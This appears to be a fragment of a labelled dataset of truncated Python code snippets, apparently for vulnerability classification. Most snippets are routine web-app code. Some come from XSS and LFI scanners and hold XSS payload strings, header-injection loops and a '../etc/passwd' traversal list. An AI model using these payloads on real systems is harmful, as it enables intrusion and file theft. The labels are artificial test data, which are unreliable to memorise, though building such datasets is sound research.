\"\"\"\u5904\u7406\u6dfb\u52a0 Article \u65f6\u7684\u8868\u5355\"\"\" model=Article template_name='post.html' context_object_name", "label": 0}, {"snippet_id": 51697, "code": "] LANGUAGE_COOKIE_NAME='dashboard_language' STATIC_URL='/static/' if DEBUG: STATIC_ROOT='static' else: STATIC_ROOT='/srv/dashboard/static/' JET_SIDE_MENU_ITEMS=[ {'label': _('\ud83d\udd27 Configuration'), 'items'", "label": 1}, {"snippet_id": 30164, "code": ": \t\tcommands=[ \"sudo systemctl %s haproxy\" % action] \t\tfunct.ssh_command(serv, commands)\t\t \t\tprint(\"HAproxy was %s\" % action) \telse: \t\tprint(\"Bad config, check please\") \t if form.getvalue('action_waf')", "label": 0}, {"snippet_id": 3949, "code": "=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header", "label": 0}, {"snippet_id": 11754, "code": "'org_id': 'RiceX'}), url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$", "label": 0}, {"snippet_id": 24982, "code": "{ \"redirect\": 'true', \"staff\": 'true', \"course_id\": self.course_key, } cms_params=urlencode(auto_auth_params) self.start_urls.append(\"\\\"http://localhost:8031/auto_auth?{}\\\"\".format(cms_params)) sequence_url", "label": 0}, {"snippet_id": 350, "code": " for xss: %s\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: xss_url=url.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) if xss_request", "label": 1}, {"snippet_id": 46198, "code": ".get_props(request.user), 'query': query, 'initial':{ 'collections': collections, 'layout': DEFAULT_LAYOUT, 'is_latest': LATEST.get(), 'engines': get_engines(request.user) } }) else: return render('search.mako'", "label": 0}, {"snippet_id": 29609, "code": ".read().decode(encoding='UTF-8') \t\telse: \t\t\treturn stdout.read().decode(encoding='UTF-8') \t\t\t \t\tfor line in stderr.read().decode(encoding='UTF-8'): \t\t\tif line: \t\t\t\tprint(\"<div class='alert alert-warning'", "label": 0}, {"snippet_id": 20037, "code": " else: msg=colorize('green', \"Cleaning up databases...\") print msg sh(\"./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"", "label": 0}, {"snippet_id": 17112, "code": "]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/debug$', 'course_groups.views", "label": 0}, {"snippet_id": 17556, "code": " django.conf import settings from django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib", "label": 0}, {"snippet_id": 18217, "code": ", url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views", "label": 1}, {"snippet_id": 13821, "code": "[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/(?P<section>[^/]*)/$', 'courseware", "label": 0}, {"snippet_id": 7, "code": " utils.logs as logs import urlparse from utils.logger import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload", "label": 0}, {"snippet_id": 21154, "code": "'xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r", "label": 0}, {"snippet_id": 39997, "code": " frappe.flags.in_import or self.is_new() or self.flags.ignore_validate_constants: \t\t\treturn \t\tconstants=[d.fieldname for d in self.meta.get(\"fields\",{\"set_only_once\":('=',1)})] \t\tif constants: \t\t\tvalues", "label": 0}, {"snippet_id": 20986, "code": ".redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key=", "label": 0}, {"snippet_id": 30328, "code": ", auth=(haproxy_user, haproxy_pass)) \texcept requests.exceptions.ConnectTimeout: \t\tprint('Oops. Connection timeout occured!') \texcept requests.exceptions.ReadTimeout: \t\tprint('Oops. Read timeout occured", "label": 0}, {"snippet_id": 32183, "code": " browser for a Git checkout.\"\"\" from __future__ import print_function import SimpleHTTPServer import SocketServer import argparse import codecs import os import re import socket import sys import threading", "label": 0}, {"snippet_id": 28400, "code": " section %s and parameter %s</div>' %(sec, var)) \t\t\t\t\t def get_data(type): \tfrom datetime import datetime \tfrom pytz import timezone \timport sql \tnow_utc=datetime.now(timezone(sql.get_setting('time_zone'", "label": 0}, {"snippet_id": 33167, "code": " @decorators.require_cronjob def get(self): config.cron_update_buckets() class BuildRPCHandler(webapp2.RequestHandler): \"\"\"Redirects to API explorer to see the build.\"\"\" def get(self, build_id): api_path", "label": 0}, {"snippet_id": 42744, "code": "=', 1)}): \t\t\tif self.get(df.fieldname) in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in", "label": 0}, {"snippet_id": 33635, "code": "\t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext.metatags", "label": 0}, {"snippet_id": 44947, "code": "=Workflow(document=Document2.objects.get(id=doc_id)) ParametersFormSet=formset_factory(ParameterForm, extra=0) if request.method=='POST': params_form=ParametersFormSet(request.POST) if params_form.is_valid()", "label": 0}, {"snippet_id": 29032, "code": ".system(\"cp scripts/%s.\" % script) \t \tproxy_serv=proxy if proxy is not None else \"\" \t\t \tcommands=[ \"sudo chmod +x \"+tmp_config_path+script+\" && \" +tmp_config_path+\"/\"+script +\" PROXY=\" +proxy_serv+ \t\t\t", "label": 0}, {"snippet_id": 23235, "code": "]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading', name='peer_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes$', 'notes.views.notes', name='notes'), url(r'^courses", "label": 0}, {"snippet_id": 2329, "code": ".W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request", "label": 0}, {"snippet_id": 21998, "code": "(?P<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration", "label": 0}, {"snippet_id": 53694, "code": " FileSystemLoader def make_eb_config(application_name, default_region): UTILS_DIR=os.path.dirname(os.path.abspath(__file__)) j2_env=Environment(loader=FileSystemLoader(UTILS_DIR)) return j2_env.get_template", "label": 1}, {"snippet_id": 34880, "code": " in children] \t\tif no_nulls: \t\t\tfor k in list(doc): \t\t\t\tif doc[k] is None: \t\t\t\t\tdel doc[k] \t\tif no_default_fields: \t\t\tfor k in list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags", "label": 0}, {"snippet_id": 5903, "code": "' % payload def style(self, payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee", "label": 0}, {"snippet_id": 31739, "code": " read '+form.getvalue('color')+' list</div>') \t\t if form.getvalue('bwlists_create'): \tlist_name=form.getvalue('bwlists_create').split('.')[0] \tlist_name +='.lst' \tlist=os.path.dirname(os.getcwd())+\"/\"+sql", "label": 0}, {"snippet_id": 10117, "code": "._expected_command(name=name)) def test_suite_spec(self): spec='test_foo.py' suite=BokChoyTestSuite('', test_spec=spec) name='tests/{}'.format(spec) self.assertEqual(suite.cmd, self._expected_command(name=name)", "label": 0}, {"snippet_id": 21883, "code": "'RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P", "label": 0}, {"snippet_id": 26149, "code": " label=_('Name'), initial=(self.instance.name_parts if self.instance else self.instance.name_parts), ) if event.settings.invoice_address_required and not event.settings.invoice_address_company_required", "label": 0}, {"snippet_id": 11941, "code": " get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views.root_create', name='root_create'), url(r'^wiki/', include(wiki_pattern())), url(r'^notify/', include(notify_pattern", "label": 0}, {"snippet_id": 6394, "code": " @property def ssl_adapter(self): \"\"\" CherryPy SSL adapter class to use(must be one of cherrypy.wsgiserver.ssl_adapters) \"\"\" return self.config.get(self.section, 'ssl_adapter') @property def server_cert", "label": 0}, {"snippet_id": 9388, "code": " 'open_ended_grading.staff_grading_service.get_next', name='staff_grading_get_next'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service", "label": 0}, {"snippet_id": 36280, "code": "): \t\t\t\tdef __setup__(self): \t\t\t\t\tself.print_hide=[\"field1\", \"field2\"] \t\t:param fieldname: Fieldname to be checked if hidden. \t\t\"\"\" \t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(", "label": 0}, {"snippet_id": 53756, "code": ".elasticbeanstalk/config.yml') parser.add_argument('--name', type=str, required=True, help='The name of the application') parser.add_argument('--region', type=str, required=True, help='The default application region", "label": 0}, {"snippet_id": 10943, "code": "\"\" Multiprocessing, xunit, color, and verbosity do not work well together. We need to construct the proper combination for use with nosetests. \"\"\" substring=[] if self.verbosity !=DEFAULT_VERBOSITY and", "label": 0}, {"snippet_id": 24928, "code": "): \"\"\" Sets up test environment with mega-course loaded, and runs pa11ycralwer against it. \"\"\" def __init__(self, *args, **kwargs): super(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs", "label": 0}, {"snippet_id": 40248, "code": ".flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not", "label": 0}, {"snippet_id": 36772, "code": "=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: \t\t\t\tcontext.comment_text=_('1 comment') \t", "label": 0}, {"snippet_id": 52677, "code": "=Document2.objects.get(type='oozie-workflow2', uuid=request.GET.get('uuid'))) response['status']=0 response['parameters']=workflow.find_all_parameters(with_lib_path=False) except Exception, e: response[", "label": 0}, {"snippet_id": 3419, "code": "=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross", "label": 0}, {"snippet_id": 34032, "code": "=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content[:340]", "label": 0}, {"snippet_id": 52057, "code": ".to_dict() for d in Document.objects.get_docs(request.user, Document2, extra='workflow2')] return render('editor/list_editor_workflows.mako', request,{ 'workflows_json': json.dumps(workflows) }) @check_document_access_permission", "label": 1}, {"snippet_id": 49860, "code": " root(): return render_template(\"home.html\") @app.route(\"/interact\", methods=[\"POST\"]) def vuln(): msg=request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu') responses", "label": 1}, {"snippet_id": 42953, "code": " self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from.split('.')[-1]]) \t\t\t\t\tnotify_link_count(doctype, docname) \t\t\t\t\tif not values.name:", "label": 0}, {"snippet_id": 32140, "code": "() return[mapping for mapping in mappings if q in mapping.ud.lower()] def get_rules_as_json(mapping): rules=getattr(mapping, 'rules', None) if rules: rules=json.dumps(rules, indent=4) return safestring", "label": 1}, {"snippet_id": 25068, "code": "}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course", "label": 0}, {"snippet_id": 45931, "code": " import allow_owner_only from dashboard.models import Collection2 from dashboard.conf import get_engines from dashboard.controller import DashboardController, can_edit_index LOG=logging.getLogger(__name__", "label": 0}, {"snippet_id": 3865, "code": " for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers.update(host_header) host_header_xss=req.api_request(url, \"GET\", headers)", "label": 0}, {"snippet_id": 44071, "code": "(RTDFacetedSearch, self).__init__(**kwargs) class ProjectSearch(RTDFacetedSearch): fields=['name^5', 'description'] facets={ 'language': TermsFacet(field='language') } class FileSearch(RTDFacetedSearch): facets={ ", "label": 0}, {"snippet_id": 29838, "code": "\"] \ttry: \t\tfunct.ssh_command(serv, commands, ip=\"1\") \texcept: \t\tprint('<div class=\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') if form.getvalue('checkSshConnect') is not None", "label": 0}, {"snippet_id": 14568, "code": ".TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"", "label": 1}, {"snippet_id": 18482, "code": "='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$', 'open_ended_grading.views.staff_grading', name='staff_grading'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading", "label": 0}, {"snippet_id": 48030, "code": "=Media.objects.get(pk=int(media_id)) user.avatarMedia=medium user.save() except Exception as e: return redirect(\"/admin?error=\" +str(e)) return redirect(\"/admin/users\") def handle_file(u: Profile, headline", "label": 0}, {"snippet_id": 28082, "code": "\"\"Log out handler.\"\"\" @handler.unsupported_on_local_server @handler.require_csrf_token @handler.get(handler.HTML) def get(self): \"\"\"Handle a get request.\"\"\" try: auth.revoke_session_cookie(auth.get_session_cookie", "label": 0}, {"snippet_id": 23864, "code": "(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite('', default_store='invalid') name='tests' self.assertEqual( suite.cmd, self._expected_command(name=name, store=", "label": 0}, {"snippet_id": 42670, "code": ", \"Currency\", \"Percent\"): \t\t\t\t\tself.set(df.fieldname, flt(self.get(df.fieldname))) \t\tif self.docstatus is not None: \t\t\tself.docstatus=cint(self.docstatus) \tdef _get_missing_mandatory_fields(self): \t\t\"\"", "label": 0}, {"snippet_id": 38092, "code": "\tcategory=frappe.local.form_dict.blog_category or frappe.local.form_dict.category \tif category: \t\tcategory_title=get_blog_category(category) \t\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title", "label": 1}, {"snippet_id": 53206, "code": " redirect(reverse('oozie:list_oozie_coordinator', kwargs={'job_id': job_id})) else: request.error(_('Invalid submission form: %s' % params_form.errors)) else: parameters=coordinator.find_all_parameters", "label": 0}, {"snippet_id": 47413, "code": "'&payload=' +str(user_id) +'\"><img class=\"button-img\" alt=\"Change avatar\" ' 'src=\"/staticfiles/frontpage/change-avatar.png\"/></a><br />')) else: f.add_content(PlainText('<h3>Add new user</h3>')) if not", "label": 0}, {"snippet_id": 51608, "code": "', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'test':{ 'ENGINE': 'django.db.backends.sqlite3', 'NAME': os.environ.get('DB_NAME', 'db.sqlite3'), }, 'production':{ 'ENGINE': DATABASE_ENGINES.get", "label": 0}, {"snippet_id": 24715, "code": "(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For", "label": 0}, {"snippet_id": 16030, "code": " django.conf.urls import patterns, include, url from django.contrib import admin from django.conf.urls.static import static from. import one_time_startup import django.contrib.auth.views if settings.DEBUG", "label": 0}, {"snippet_id": 48023, "code": "='You're not allowed to edit other users.'\") medium=Media.objects.get(pk=int(media_id)) user.avatarMedia=medium user.save() except Exception as e: return redirect(\"/admin?error=\" +str(e)) return redirect", "label": 0}, {"snippet_id": 20508, "code": "'wget{tar_gz_file} -O{zipped_course}'.format( tar_gz_file=self.tar_gz_file, zipped_course=zipped_course, ) ) msg=colorize('green', \"Uncompressing the test course...\") print msg sh( 'tar zxf{zipped_course", "label": 0}, {"snippet_id": 46819, "code": " content): return await self.set_props_by_key('content', content) async def save(self, *args, **kwargs): content=kwargs.pop('content', None) if content is not None: await self.set_content(content) return", "label": 0}, {"snippet_id": 26537, "code": "%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '../../etc/passwd%00', '../../../etc/passwd%00', '../../../", "label": 0}, {"snippet_id": 44453, "code": "'selection')) for job in jobs: doc2=Document2.objects.get(type='oozie-workflow2', id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2", "label": 0}, {"snippet_id": 34404, "code": " and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key) \t\t\treturn value \t\telse: \t\t\treturn self.__dict__", "label": 0}, {"snippet_id": 41178, "code": " get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(), \t\t \t\ttitle=_('Blog", "label": 0}, {"snippet_id": 13912, "code": ", name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading$", "label": 0}, {"snippet_id": 2314, "code": ".logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid", "label": 0}, {"snippet_id": 48139, "code": "\"/\" +low_res_file_name m.headline=headline m.save() mu: MediaUpload=MediaUpload() mu.UID=u mu.MID=m mu.save() logging.info(\"Uploaded file '\" +str(file.name) +\"' and cropped it. The resulting PK is \" +str", "label": 1}, {"snippet_id": 49381, "code": ": return self.label def get_url(self): return self.get_url_with_query_params({ self.field_name: self.value }) def is_active(self): if self.field_name in self.query_params: selected_value=self.query_params", "label": 0}, {"snippet_id": 43550, "code": "=None): \t\t\"\"\"Returns float precision for a particular field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\"", "label": 0}, {"snippet_id": 35601, "code": ".fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel=_(self.meta.get_label(df.fieldname", "label": 0}, {"snippet_id": 19753, "code": " for tests log_dir -directory for test output report_dir -directory for reports(e.g., coverage) related to test execution xunit_report -directory for xunit-style output(xml) fasttest -when set, skip various", "label": 0}, {"snippet_id": 33795, "code": "\telif frappe.local.form_dict.txt: \t\tlist_context.sub_title=_('Filtered by \"{0}\"').format(frappe.local.form_dict.txt) \tif list_context.sub_title: \t\tlist_context.parents=[{\"name\": _(\"Home\"), \"route\": \"/\"},", "label": 1}, {"snippet_id": 26370, "code": " reimbursement process.')) except vat_moss.errors.WebServiceError: logger.exception('VAT ID checking failed for country{}'.format(data.get('country'))) self.instance.vat_id_validated=False if self.request", "label": 0}, {"snippet_id": 46651, "code": " get(self, request, *args, **kwargs): form=self.get_form() if form.is_valid(): return self.form_valid(form) else: return self.render_to_response(self.get_context_data()) def get_form_kwargs(self, *args, *", "label": 0}, {"snippet_id": 38963, "code": " None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal']=1 \t\treturn value \tdef get_valid_dict(self, sanitize=True, convert_dates_to_str=False): ", "label": 0}, {"snippet_id": 37756, "code": "\t} \tposts=frappe.db.sql(query, as_dict=1) \tfor post in posts: \t\tpost.cover_image=find_first_image(post.content) \t\tpost.published=global_date_format(post.creation) \t\tpost.content=strip_html_tags(post.content", "label": 0}, {"snippet_id": 29414, "code": " \t\tprint('<div class=\"alert alert-danger\">Can\\'t read export config file</div>') \t \tfirewalld_commands=[] \t \tfor line in conf: \t\tif \"bind\" in line: \t\t\tbind=line.split(\":\") \t\t\tbind[1]=bind[1].strip(' ')", "label": 0}, {"snippet_id": 23263, "code": " if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r'^masquerade/(?P<marg>.*)$', 'courseware.masquerade.handle_ajax', name=\"masquerade-switch\"), ) if settings.MITX_FEATURES.get('ENABLE_DISCUSSION_SERVICE", "label": 0}, {"snippet_id": 31899, "code": " error)\t\t\t \t\telse: \t\t\tprint('<div class=\"alert alert-success\" style=\"margin:10px\">Edited '+form.getvalue('color')+' list was uploaded to '+server[1]+'</div>') \t\t\tif form.getvalue('bwlists_restart')=='restart", "label": 0}, {"snippet_id": 1450, "code": "\"Access-Control-Allow-Origin\"]=\"*\" return resp @app.route('/', defaults={'page': 'scan.html'}) @app.route('/<page>') def view_dashboard(page): return render_template('{}'.format(page)) app.run(host='0.0", "label": 0}, {"snippet_id": 31345, "code": " \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file(\"templates/metrics_out.html\", mode='inline') \t\t \t\tx_min=df.index", "label": 0}, {"snippet_id": 23062, "code": "'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/staff_grading/save_grade$', 'open_ended_grading.staff_grading_service.save_grade', name='staff_grading_save_grade'), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 43751, "code": "\t\tmeta_df=self.meta.get_field(fieldname) \t\tif meta_df and meta_df.get(\"__print_hide\"): \t\t\treturn True \t\tprint_hide=0 \t\tif self.get(fieldname)==0 and not self.meta.istable: \t\t\tprint_hide=( df and df.print_hide_if_no_value", "label": 0}, {"snippet_id": 54075, "code": ".get()==\"GET\": get=True post=False elif method.get()==\"POST\": get=False post=True else: get=True post=True fresh=False if refresh.get()==\"On\": fresh=True ck=None c=cookie.get() if len(c)>0: ck=c for x in", "label": 0}, {"snippet_id": 26455, "code": ".jpg onerror=alert(1)>\"] lfi_attacks=[ '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd', '../../../../../etc/passwd', '../../../../../../etc/passwd', '../../../../../../../etc/passwd", "label": 0}, {"snippet_id": 51893, "code": " CELERY_task_serializer='pickle' CELERY_result_serializer='pickle' CELERY_BROKER_URL=os.environ.get('BROKER', 'redis://localhost:6379/0') ENABLE_UTC=True CELERY_ACCEPT_CONTENT=['pickle'] CELERY_TASK_SERIALIZER", "label": 0}, {"snippet_id": 36934, "code": "}] \tlist_context.update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle", "label": 0}, {"snippet_id": 12449, "code": "]+)/staff_grading/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$", "label": 0}, {"snippet_id": 11196, "code": " string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR=", "label": 0}, {"snippet_id": 53484, "code": ".can_read_or_exception(request.user) bundle_doc.dependencies=dependencies bundle_doc.update_data(bundle_data) bundle_doc.name=bundle_data['name'] bundle_doc.save() response['status']=0 response['id']=bundle_doc.id response", "label": 0}, {"snippet_id": 4444, "code": " Payload\"\"\" homograph={ 'a': '\\u0430', 'c': '\\u03F2', 'd': '\\u0501', 'e': '\\u0435', 'h': '\\u04BB', 'i': '\\u0456', 'j': '\\u0458', 'l': '\\u04CF', 'o': '\\u043E', 'p': '\\u0440', 'r': '\\u0433', 'q': '\\u051B', ", "label": 0}, {"snippet_id": 30352, "code": " occured') \texcept requests.exceptions.HTTPError as errh: \t\tprint(\"Http Error:\",errh) \texcept requests.exceptions.ConnectionError as errc: \t\tprint('<div class=\"alert alert-danger\">Error Connecting: %s</div>'", "label": 0}, {"snippet_id": 12154, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book-shifted/(?P<page>[^/]*)$', 'staticbook", "label": 1}, {"snippet_id": 18938, "code": ".get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION'): urlpatterns +=( url(r'^migrate", "label": 0}, {"snippet_id": 33031, "code": ".write(contents.encode('utf-8')) class _AdjustTOC(markdown.treeprocessors.Treeprocessor): def __init__(self, has_a_single_h1): super(_AdjustTOC, self).__init__() self.has_a_single_h1=has_a_single_h1 def", "label": 0}, {"snippet_id": 5658, "code": "'<img sRc=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x", "label": 0}, {"snippet_id": 37424, "code": "\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title, \"route\":context", "label": 0}, {"snippet_id": 8997, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', ", "label": 0}, {"snippet_id": 29750, "code": "'haproxy_save_configs_dir'), format='cfg', **kwargs): \timport glob \tfile=set() \treturn_files=set() \t \tfor files in glob.glob(os.path.join(dir,'*.'+format)):\t\t\t\t \t\tfile.add(files.split('/')[-1]) \tfiles=sorted(file, reverse", "label": 0}, {"snippet_id": 23962, "code": " expected_verbosity_string=( \"--with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ", "label": 0}, {"snippet_id": 1795, "code": "=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[-1]=='API': path='../Payloads/xss.txt' else: path='Payloads/xss.txt' with open(path) as f: for line", "label": 0}, {"snippet_id": 13186, "code": ".auth.views.password_change, name='auth_password_change'), url(r'^password_change_done/$', django.contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/", "label": 0}, {"snippet_id": 13263, "code": "'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$", "label": 0}, {"snippet_id": 20965, "code": ".html'}, name=\"help_edx\"), url(r'^press/([_a-zA-Z0-9-]+)$', 'static_template_view.views.render_press_release', name='press_release'), (r'^favicon\\.ico$', 'django.views.generic.simple.redirect_to',{'url", "label": 0}, {"snippet_id": 13666, "code": ", 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]", "label": 1}, {"snippet_id": 50711, "code": " to the protocol \"\"\" self.sessionhandler.data_out(self, **kwargs) def send_text(self, *args, **kwargs): \"\"\" Send text data. This will pre-process the text for color-replacement, conversion to html etc.", "label": 0}, {"snippet_id": 8794, "code": "'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', ", "label": 0}, {"snippet_id": 44791, "code": "('node', '{}')) parameters=parameters.union(set(Node(node_data).find_parameters())) script_path=node_data.get('properties',{}).get('script_path',{}) if script_path: script_path=script_path.replace('hdfs", "label": 0}, {"snippet_id": 23147, "code": "', name=\"cohorts\"), 